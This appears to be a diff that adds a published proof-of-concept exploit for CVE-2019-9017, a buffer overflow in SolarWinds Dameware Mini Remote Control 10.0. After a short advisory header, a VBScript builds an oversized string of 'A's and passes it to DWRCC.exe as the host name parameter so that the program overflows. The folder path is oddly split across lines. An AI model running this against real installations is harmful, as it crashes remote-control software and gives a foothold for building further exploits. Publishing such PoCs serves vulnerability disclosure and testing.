@@ -1,0 +1,32 @@
+#Vendor:     Solarwinds
+#Site Vendor:    https://www.dameware.com/
+#Product:     Dameware Mini Remote Control
+#Version:    10.0 x64
+#Platform:    Windows
+#Tested on:    Windows 7 SP1 x64
+#Dscription:    The DWRCC executable file is affected by a buffer overflow vulnerability.
+#The buffer size passed in on the machine name parameter is not checked
+#Vector:    pass buffer to the machine host name parameter
+
+#Author:    Dino Barlattani dinbar78@gmail.com
+#Link:        http://www.binaryworld.it
+
+#CVE ID:    CVE-2019-9017
+
+#POC in VB Script
+
+option explicit
+dim fold,exe,buf,i,wsh,fso,result
+exe = "DWRCC.exe"
+fold = "C:\program files\SolarWinds\DameWare Mini Remote Control 10.0 x64
+#1\"
+for i = 0 to 300
+    buf = buf & "A"
+next
+set wsh = createobject("wscript.shell")
+set fso = createobject("scripting.filesystemobject")
+if fso.folderexists(fold) then
+    fold = fold & exe
+    fold = chr(34) & fold & chr(34)
+    result = wsh.run(fold & " -c: -h: -m:" & buf,0,true)
+end if
